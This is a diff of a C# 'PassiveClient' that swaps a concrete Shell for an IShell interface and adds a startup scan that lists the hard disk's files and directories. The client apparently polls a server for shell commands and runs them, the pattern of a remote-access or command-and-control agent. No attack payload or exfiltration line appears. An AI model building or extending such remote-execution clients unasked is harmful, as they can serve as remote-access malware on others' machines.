@@ -1,5 +1,7 @@
 ﻿using AlertCallBack;
 using PassiveClient.Data;
+using PassiveClient.Helpers;
+using PassiveClient.Helpers.Interfaces;
 using PassiveShell;
 using PostSharp.Extensibility;
 using PostSharp.Patterns.Diagnostics;
@@ -17,13 +19,14 @@ namespace PassiveClient
         private IPassiveShell _shelService;
         private AletCallBackClient _proxy;
         private Action<string> _onError;
-        private Shell _shellHandler;
         private StatusCallBack _statusCallBack;
         private bool _isDead = false;
         private string _id;
         private string _currentTasktId;
         private Object _programLock;
         private string _nickName;
+
+        private IShell _shell;
 
 
         private void SetReliableSessionAndInactivityTimeoutAndReaderQuotas(NetTcpBinding wsd)
@@ -42,11 +45,18 @@ namespace PassiveClient
         public void Initialize(CallBackInitializeData data)
         {
             _statusCallBack = data.StatusCallBack;
-            _shellHandler = new Shell();
             _shelService = data.Proxy;
             _onError = data.ContinuationError;
             _programLock = data.ProgramLock;
             _nickName = data.NickName;
+             _shell = new CSharpShell();
+            InitializeHardDiskInDirHeleper();
+        }
+
+        private void InitializeHardDiskInDirHeleper()
+        {
+            //Generate the first die is causing the hard drive list to fill. filling the hard disk takes couple of seconds
+            DirHelper.GenerateFilesAndDirString();
         }
 
         public void SendServerCallBack(string wcfServicesPathId, string id)
@@ -78,7 +88,7 @@ namespace PassiveClient
                
             try
             {
-                CheckMissions(_shellHandler);
+                CheckMissions(_shell);
             }
             catch
             {
@@ -111,7 +121,7 @@ namespace PassiveClient
             //Do nothing, this function is only for the server in order to send traffic through the connection pipe  
         }
 
-        public void CheckMissions(Shell shellHandler)
+        public void CheckMissions(IShell shellHandler)
         {
             if (CheckIfHasShellCommand())
             {
@@ -175,7 +185,7 @@ namespace PassiveClient
             return CommunicationExceptionHandler.SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() => _shelService.HasCommand(_id));
         }
 
-        private void ShellCommandHendler(Shell shellHandler)
+        private void ShellCommandHendler(IShell shellHandler)
         {
             try
             {
@@ -224,7 +234,7 @@ namespace PassiveClient
             }
         }
 
-        private void ProcessNextCommand(Shell shellHandler)
+        private void ProcessNextCommand(IShell shellHandler)
         {
             var command = CommunicationExceptionHandler.SendRequestAndTryAgainIfTimeOutOrEndpointNotFound(() => _shelService.PassiveNextCommand(_id));
             _currentTasktId = command.Item3;
